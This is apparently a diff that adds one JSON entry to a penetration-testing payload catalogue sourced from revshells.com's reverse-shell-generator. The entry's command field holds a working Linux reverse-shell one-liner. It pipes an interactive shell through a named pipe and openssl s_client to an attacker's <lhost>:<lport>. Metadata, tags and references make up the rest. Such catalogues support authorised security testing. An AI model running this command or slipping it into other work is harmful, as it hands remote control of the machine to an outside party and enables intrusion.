@@ -1,0 +1,29 @@
+{
+  "id": "rsg-reverseshell-openssl",
+  "name": "RSG · ReverseShell · OpenSSL",
+  "command": "mkfifo /tmp/s; <shell> -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <lhost>:<lport> > /tmp/s; rm /tmp/s",
+  "description": "Reverse Shell payload — OpenSSL (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux",
+    "mac"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/OpenSSL/20",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
